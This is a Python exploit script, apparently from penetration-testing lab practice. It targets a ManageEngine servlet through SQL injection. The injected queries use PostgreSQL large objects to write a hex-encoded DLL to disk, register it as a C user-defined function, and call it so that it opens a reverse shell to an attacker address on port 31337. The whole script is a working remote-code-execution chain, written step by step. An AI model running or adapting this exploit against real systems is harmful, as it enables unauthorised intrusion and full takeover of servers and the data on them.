# create dll for malicious code + host on SMB server
# create a large object from file on disk
# update the page 0 of created object with first 2048 bytes of dll
# inject query to insert additional pages into our pg_largeobject table for remanding bytes
# query to export our dll/large object into the file system
# query to create a UDF from our DLL that is now on the disk
# query our malicious UDF to get a shell.

import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file():
    with open('rce.dll.txt', 'r') as f:
        encoded_dll = f.readline()
        return encoded_dll

encoded_dll = str(read_file())

def log(msg):
    print(msg)

def send(query):
    url = "https://manageengine:8443"
    path = f"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{query};--"
    endpoint = url + path
    req = requests.get(endpoint, verify=False).status_code

    if int(req) == 200:
        return True
    else:
        print("[-] Fatal error..")
        return False
    
def wait(seconds):
    log("Sleeping for {} seconds".format(str(seconds)))
    time.sleep(seconds)

def delete_existing_lo():
    log("[i] sending lo_unlink request")
    query = f"SELECT lo_unlink((SELECT loid from pg_largeobject))"
    send(query)

def create_lo():
    log("[i] sending lo_import request")
    query = f"SELECT lo_import($$C:\\windows\\win.ini$$)"
    send(query)

def overwrite_pageno():
    log("[i] overwriting LO Pageno with Bytes")
    for i in range(0,int(len(encoded_dll)/4096)):
        data_chunk = encoded_dll[i*4096:(i+1)*4096]

        print("[*] chunk:", data_chunk, end='\n\n')
        if i == 0:
            query = f"UPDATE PG_LARGEOBJECT SET data=decode($${data_chunk}$$, $$hex$$) where LOID=(SELECT loid from pg_largeobject) and pageno={i}"
        else:
            query = f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ((SELECT loid from pg_largeobject)), {i}, decode($${data_chunk}$$, $$hex$$))"

        send(query)

def export_object():
    log("[i] exporting LO to the File System (might take a few seconds..)")
    query = f"SELECT lo_export((SELECT loid from pg_largeobject)), $$C:\\pwn.dll$$)"
    send(query)

# now create our function and get a shell back
def create_pwn_function():
    log("[i] creating 'pwn' function")
    query = "create or replace function pwn(text,integer) returns VOID as $$C:\\pwn.dll$$, $$connect_back$$ language C strict"
    send(query)

# the moment of truth
def pwn(addr, port):
    log("[!] triggering pwn function..")
    query = f"SELECT pwn($${addr}$$, {port})"
    send(query)


def main():
    print("::: pg large object dll rce")
    print("::: manage engine exploit\n")
    # delete existing pg_largeobjects for cleanup
    delete_existing_lo()
    # import a file from disk into an object
    create_lo()
    # loop through all bytes in the dll to overwrite 2kb chunks
    # of the object page
    overwrite_pageno()
    # export the object and all pages back to a .dll on the victim machine
    export_object()
    # create a user defined function using the .dll file
    create_pwn_function()
    # call the function 'pwn' and pass attacker IP and PORT for callback
    pwn('192.168.45.191', 31337)
    delete_existing_lo()

main()